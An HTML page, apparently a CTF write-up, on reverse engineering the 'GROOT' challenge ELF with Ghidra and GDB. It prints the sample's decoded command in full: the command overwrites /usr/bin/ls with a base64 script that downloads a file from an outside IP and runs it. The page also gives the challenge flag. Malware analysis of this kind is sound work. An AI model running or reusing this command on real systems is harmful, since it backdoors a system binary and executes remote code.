@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+      
+    <meta name="twitter:title" content="GROOT">
+    <meta name="twitter:description" content="BinForCry 100 pts">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" content="https://altelus1.github.io/writeups/ctf/rootcon17quals/images/groot_1.png" />
+    
+    <meta property="og:image" content="/writeups/ctf/rootcon17quals/images/groot_1.png">
+    <meta property="og:description" content="BinForCry 100 pts">
+    <title>GROOT</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="GROOT" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/writeups/ctf/rootcon17quals/groot.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/ctf/rootcon17quals/groot.html" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="GROOT" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"GROOT","url":"http://localhost:4000/writeups/ctf/rootcon17quals/groot.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+
+
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">Home</a></li><li><a href="/about.html">About</a></li><li><a href="/writeups/">Writeups</a></li><li><a href="/projects/">Projects</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="binforcry-groot---100-pts">[BinForCry] GROOT - 100 Pts.</h1>
+<p><br />
+We’re given with this file.<br />
+<img src="images/groot_1.png" alt="lol it didn't load" /><br />
+Checking out the file, it is an ELF file.</p>
+
+<p><br /></p>
+
+<p><img src="images/groot_2.png" alt="lol it didn't load" />
+<br /></p>
+
+<p>We did the reverse engineering on <a href="https://remnux.org/">Remnux</a>.</p>
+
+<p><br />First off, we fired up Ghidra and decompile the ELF. After entering the main method, we noticed a function that’s consistently called.</p>
+
+<p><br /><img src="images/groot_3.png" alt="lol it didn't load" /></p>
+
+<p><br />Looking at the decompiled function, it seems to be doing an encryption machanism, albeit a basic one (just XOR). Also notice that the result is being stored on <code class="language-plaintext highlighter-rouge">param_3</code> which means the RDX value. Therefore, we have to note the address of RDX before and after the function has been called.</p>
+
+<p><br /><img src="images/groot_4.png" alt="lol it didn't load" /></p>
+
+<p><br />We can open up GEF-GDB and set a break point each time the function is called and then analyze arguments and also the output once we step over the function.</p>
+
+<p><br />First, we have to get the main address after PIE is applied. In my environment, it is <code class="language-plaintext highlighter-rouge">0x5555555552dc</code>
+<br /><img src="images/groot_5.png" alt="lol it didn't load" /></p>
+
+<p><br />We can then show the instructions starting from the main address
+<br /><img src="images/groot_6.png" alt="lol it didn't load" />
+<br /><img src="images/groot_7.png" alt="lol it didn't load" />
+<br />The list of breakpoints to use are:</p>
+<ul>
+  <li>0x555555555364</li>
+  <li>0x5555555553db</li>
+  <li>0x5555555554b7</li>
+</ul>
+
+<p><br />There are more addresses that call that function but these are the only ones that we need.
+<br />Breaking at 0x555555555364, we mark the function arguments and we need to keep an eye on RDX register value from what we understod on the function. XOR result is being stored in there after we step over 1 instruction after the breakpoint. This will be done everytime we hit the breakpoint
+<br /><img src="images/groot_8.png" alt="lol it didn't load" />
+<br />After stepping over, we got the first part of the flag <code class="language-plaintext highlighter-rouge">RC17{x0x0_</code>. Nice!
+<br /><img src="images/groot_9.png" alt="lol it didn't load" />
+<br />Next important breakpoint is at 0x5555555553db. The resulting XOR operation is not interesting:
+<br /><img src="images/groot_10.png" alt="lol it didn't load" />
+<br />But we want to set the <code class="language-plaintext highlighter-rouge">geteuid</code> result to 0 on the <code class="language-plaintext highlighter-rouge">test eax, eax</code> otherwise the process would have stopped. That means we have to set the RAX to 0.
+<br /><img src="images/groot_11.png" alt="lol it didn't load" />
+<br />We go to breakpoint 0x5555555554b7 and we note the RDX address again (0x00007fffffffce40).
+<br /><img src="images/groot_12.png" alt="lol it didn't load" />
+<br />After stepping over, we found an interesting decoded result:
+<br /><img src="images/groot_13.png" alt="lol it didn't load" />
+<br /><code class="language-plaintext highlighter-rouge">cp /usr/bin/ls /usr/bin/lls &amp;&amp; cp /bin/ls /bin/lls &amp;&amp; echo -n IyEvYmluL2Jhc2gKCiMgcGFydCAyIC0geDByMW5nXzFzX2x5ZgooY3VybCAtcyBodHRwOi8vMTc4LjEyOC4yMy4xNDEvMGJlOTIxOTAvYWJjIC1vIC91c3IvYmluL3gwcjFuZ18xc19seWYgJiYgY2htb2QgK3ggL3Vzci9iaW4veDByMW5nXzFzX2x5ZiAmJiAvdXNyL2Jpbi94MHIxbmdfMXNfbHlmIDI+L2Rldi9udWxsKSAmCgovdXNyL2Jpbi9sbHMgJEAK | base64 -d &gt; /usr/bin/ls &amp;&amp; chmod +x /usr/bin/ls;</code>. The base64 blob is actually a bash script. It would have bricked your system if you executed this as root. And also, it contains the part 2 of the flag!
+<br /><img src="images/groot_14.png" alt="lol it didn't load" />
+<br />The flag for now is <code class="language-plaintext highlighter-rouge">RC17{x0x0_x0r1ng_1s_lyf</code>.
+<br />For the last part of the flag. we executed the whole thing as root anyway and we got this. (Of course we didn’t forget to take a snapshot of the remnux VM) 
+<br /><img src="images/groot_15.png" alt="lol it didn't load" />
+<br />The flag has been completed: <code class="language-plaintext highlighter-rouge">RC17{x0x0_X0r1ng_1s_lyf_thx4ex3cut1ngth1s}</code></p>
+
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
